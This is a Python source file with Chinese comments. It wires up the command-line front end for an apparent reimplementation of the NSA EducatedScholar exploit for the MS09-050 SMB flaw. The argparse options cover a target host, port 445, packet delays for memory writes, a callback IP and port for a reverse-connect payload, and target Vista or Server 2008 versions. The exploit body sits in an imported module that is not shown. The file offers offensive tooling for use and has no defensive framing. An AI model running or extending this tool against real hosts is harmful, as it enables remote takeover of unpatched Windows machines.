"""educated-scholar — MS09-050 (EDUCATEDSCHOLAR / EDU) SMB 远程利用。

Python 重写的 NSA Educatedscholar 利用工具 `Educatedscholar-1.0.0.exe`
(C++ / DAVE framework)，通过 IDA Pro / x32dbg 逆向恢复。
实现了该工具的 key=value 参数接口及其 SMB/MS09-050 利用流程。
"""

from . import educated_scholar


# ---------------------------------------------------------------------------
# Subcommand entrypoint.
# ---------------------------------------------------------------------------
def educated_scholar_handle(args):
    """Run the EDUCATEDSCHOLAR exploitation sequence against the supplied host."""
    return educated_scholar.run_function(
        target=args.target,
        port=args.port,
        timeout=args.timeout,
        packet_delay=args.packet_delay,
        callback_ip=args.callback_ip,
        callback_port=args.callback_port,
        callback_local_port=args.callback_local_port,
        target_os=args.target_os,
        verbose=args.verbose,
    )


def reg_subparser(subparsers):
    """Register the `educated-scholar` subcommand on an argparse subparsers group."""
    p = subparsers.add_parser(
        "educated-scholar",
        help="MS09-050 (EDUCATEDSCHOLAR) SMB 远程利用",
        description="Python 重写的 NSA Educatedscholar (EDU / MS09-050) 利用工具 "
                    "Educatedscholar-1.0.0。通过 TCP 445 驱动 SMB，执行内存写入"
                    "与 ROP 链利用，并可选投递 egg 回连载荷。",
    )
    p.add_argument(
        "target", metavar="TARGET",
        help="目标主机名或 IP",
    )
    p.add_argument(
        "-p", "--port", type=int, default=445,
        help="目标 SMB 端口（默认 445）",
    )
    p.add_argument(
        "--timeout", type=int, default=60,
        help="阻塞网络调用超时秒（-1 表示无超时，默认 60）",
    )
    p.add_argument(
        "--packet-delay", type=int, default=150,
        help="内存写入数据包间延迟毫秒（默认 150）",
    )
    p.add_argument(
        "--callback-ip", metavar="IP",
        help="目标连回的 IP 地址",
    )
    p.add_argument(
        "--callback-port", type=int, metavar="PORT",
        help="目标连回的端口",
    )
    p.add_argument(
        "--callback-local-port", type=int, metavar="PORT",
        help="本地监听端口",
    )
    p.add_argument(
        "--target-os",
        choices=["VistaSP1", "VistaSP2", "2K8SP1", "2K8SP2"],
        default="VistaSP1",
        help="目标操作系统与服务包（默认 VistaSP1）",
    )
    p.add_argument(
        "-v", "--verbose", action="store_true",
        help="输出参数与调试信息",
    )
    p.set_defaults(func=educated_scholar_handle)
